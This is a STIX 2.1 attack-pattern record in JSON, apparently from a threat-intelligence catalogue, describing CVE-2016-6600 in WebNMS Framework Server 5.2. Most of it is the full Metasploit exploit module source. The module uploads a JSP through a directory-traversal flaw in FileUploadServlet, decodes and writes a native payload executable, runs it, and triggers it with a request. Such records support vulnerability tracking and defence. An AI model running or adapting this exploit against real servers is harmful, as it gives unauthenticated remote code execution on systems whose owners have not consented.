{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--2bf98d04-a4dd-4815-b2ac-c51716191eeb",
    "created": "2024-08-14T17:09:26.037003Z",
    "modified": "2024-08-14T17:09:26.037007Z",
    "name": "WebNMS Framework Server Arbitrary File Upload",
    "description": "( This module abuses a vulnerability in WebNMS Framework Server 5.2 that allows an unauthenticated user to upload text files by using a directory traversal attack on the FileUploadServlet servlet. A JSP file can be uploaded that then drops and executes a malicious payload, achieving code execution under the user which the WebNMS server is running. This module has been tested with WebNMS Framework Server 5.2 and 5.2 SP1 on Windows and Linux. )",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/webnms_file_upload.rb",
            "external_id": "webnms_file_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-6600"
        },
        {
            "source_name": "reference",
            "url": "https://blogs.securiteam.com/index.php/archives/2712"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2016/Aug/54"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::FileDropper\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name'         => 'WebNMS Framework Server Arbitrary File Upload',\n        'Description'  => %q(\nThis module abuses a vulnerability in WebNMS Framework Server 5.2 that allows an\nunauthenticated user to upload text files by using a directory traversal attack\non the FileUploadServlet servlet. A JSP file can be uploaded that then drops and\nexecutes a malicious payload, achieving code execution under the user which the\nWebNMS server is running.\nThis module has been tested with WebNMS Framework Server 5.2 and 5.2 SP1 on\nWindows and Linux.\n),\n        'Author'       =>\n          [\n            'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and Metasploit module\n          ],\n        'License'      => MSF_LICENSE,\n        'References'   =>\n          [\n            [ 'CVE', '2016-6600'],\n            [ 'URL', 'https://blogs.securiteam.com/index.php/archives/2712' ],\n            [ 'URL', 'https://seclists.org/fulldisclosure/2016/Aug/54' ]\n          ],\n        'DefaultOptions' => { 'WfsDelay' => 15 },\n        'Privileged'   => false,\n        'Platform'     => %w(linux win),\n        'Targets'      =>\n          [\n            [ 'Automatic', {} ],\n            [\n              'WebNMS Framework Server 5.2 / 5.2 SP1 - Linux',\n              {\n                'Platform' => 'linux',\n                'Arch'     => ARCH_X86\n              }\n            ],\n            [\n              'WebNMS Framework Server 5.2 / 5.2 SP1 - Windows',\n              {\n                'Platform' => 'win',\n                'Arch'     => ARCH_X86\n              }\n            ]\n          ],\n        'DefaultTarget'  => 0,\n        'DisclosureDate' => '2016-07-04'\n      )\n    )\n\n    register_options(\n      [\n        Opt::RPORT(9090),\n        OptString.new('TARGETURI', [ true, \"WebNMS path\", '/'])\n      ],\n      self.class\n    )\n  end\n\n  def check\n    res = send_request_cgi(\n      'uri'    => normalize_uri(target_uri.path, 'servlets', 'FileUploadServlet'),\n      'method' => 'GET'\n    )\n    if res && res.code == 405\n      return Exploit::CheckCode::Detected\n    else\n      return Exploit::CheckCode::Unknown\n    end\n  end\n\n  def upload_payload(payload, is_exploit)\n    jsp_name = 'WebStart-' + rand_text_alpha(rand(8) + 3) + '.jsp'\n    if is_exploit\n      print_status(\"#{peer} - Uploading payload...\")\n    end\n    res = send_request_cgi(\n      'uri'    => normalize_uri(target_uri.path, 'servlets', 'FileUploadServlet'),\n      'method' => 'POST',\n      'data'   => payload.to_s,\n      'ctype'  => 'text/html',\n      'vars_get' => { 'fileName' => '../jsp/' + jsp_name }\n    )\n\n    if res && res.code == 200 && res.body.to_s =~ /Successfully written polleddata file/\n      if is_exploit\n        print_good(\"#{peer} - Payload uploaded successfully\")\n      end\n      return jsp_name\n    else\n      return nil\n    end\n  end\n\n  def pick_target\n    return target if target.name != 'Automatic'\n\n    print_status(\"#{peer} - Determining target\")\n    os_finder_payload = %{<html><body><%out.println(System.getProperty(\"os.name\"));%></body><html>}\n    jsp_name = upload_payload(os_finder_payload, false)\n\n    res = send_request_cgi(\n      'uri'    => normalize_uri(target_uri.path, 'jsp', jsp_name),\n      'method' => 'GET'\n    )\n\n    if res && res.code == 200\n      register_files_for_cleanup('jsp/' + jsp_name)\n      if res.body.include? \"Linux\"\n        return targets[1]\n      elsif res.body.include? \"Windows\"\n        return targets[2]\n      end\n    end\n\n    return nil\n  end\n\n  def generate_jsp_payload\n    opts = { arch: @my_target.arch, platform: @my_target.platform }\n    payload = exploit_regenerate_payload(@my_target.platform, @my_target.arch)\n    exe = generate_payload_exe(opts)\n    base64_exe = Rex::Text.encode_base64(exe)\n\n    native_payload_name = rand_text_alpha(rand(6) + 3)\n    ext = (@my_target['Platform'] == 'win') ? '.exe' : '.bin'\n\n    var_raw     = rand_text_alpha(rand(8) + 3)\n    var_ostream = rand_text_alpha(rand(8) + 3)\n    var_buf     = rand_text_alpha(rand(8) + 3)\n    var_decoder = rand_text_alpha(rand(8) + 3)\n    var_tmp     = rand_text_alpha(rand(8) + 3)\n    var_path    = rand_text_alpha(rand(8) + 3)\n    var_proc2   = rand_text_alpha(rand(8) + 3)\n\n    if @my_target['Platform'] == 'linux'\n      var_proc1 = Rex::Text.rand_text_alpha(rand(8) + 3)\n      chmod = %|\n      Process #{var_proc1} = Runtime.getRuntime().exec(\"chmod 777 \" + #{var_path});\n      Thread.sleep(200);\n      |\n\n      var_proc3 = Rex::Text.rand_text_alpha(rand(8) + 3)\n      cleanup = %|\n      Thread.sleep(200);\n      Process #{var_proc3} = Runtime.getRuntime().exec(\"rm \" + #{var_path});\n      |\n    else\n      chmod = ''\n      cleanup = ''\n    end\n\n    jsp = %|\n    <%@page import=\"java.io.*\"%>\n    <%@page import=\"sun.misc.BASE64Decoder\"%>\n    <%\n    try {\n      String #{var_buf} = \"#{base64_exe}\";\n      BASE64Decoder #{var_decoder} = new BASE64Decoder();\n      byte[] #{var_raw} = #{var_decoder}.decodeBuffer(#{var_buf}.toString());\n\n      File #{var_tmp} = File.createTempFile(\"#{native_payload_name}\", \"#{ext}\");\n      String #{var_path} = #{var_tmp}.getAbsolutePath();\n\n      BufferedOutputStream #{var_ostream} =\n        new BufferedOutputStream(new FileOutputStream(#{var_path}));\n      #{var_ostream}.write(#{var_raw});\n      #{var_ostream}.close();\n      #{chmod}\n      Process #{var_proc2} = Runtime.getRuntime().exec(#{var_path});\n      #{cleanup}\n    } catch (Exception e) {\n    }\n    %>\n    |\n    jsp.delete!(\"\\n\\r\\t\")\n    return jsp\n  end\n\n  def exploit\n    @my_target = pick_target\n    if @my_target.nil?\n      print_error(\"#{peer} - Unable to select a target, we must bail.\")\n      return\n    else\n      print_status(\"#{peer} - Selected target #{@my_target.name}\")\n    end\n\n    # When using auto targeting, MSF selects the Windows meterpreter as the default payload.\n    # Fail if this is the case and ask the user to select an appropriate payload.\n    if @my_target['Platform'] == 'linux' && payload_instance.name =~ /Windows/\n      fail_with(Failure::BadConfig, \"#{peer} - Select a compatible payload for this Linux target.\")\n    end\n\n    jsp_payload = generate_jsp_payload\n    jsp_name = upload_payload(jsp_payload, true)\n    if jsp_name.nil?\n      fail_with(Failure::Unknown, \"#{peer} - Payload upload failed\")\n    else\n      register_files_for_cleanup('jsp/' + jsp_name)\n    end\n\n    print_status(\"#{peer} - Executing payload...\")\n    send_request_cgi(\n      'uri'    => normalize_uri(target_uri.path, 'jsp', jsp_name),\n      'method' => 'GET'\n    )\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-07-04",
    "x_mitre_platforms": [
        "win'"
    ]
}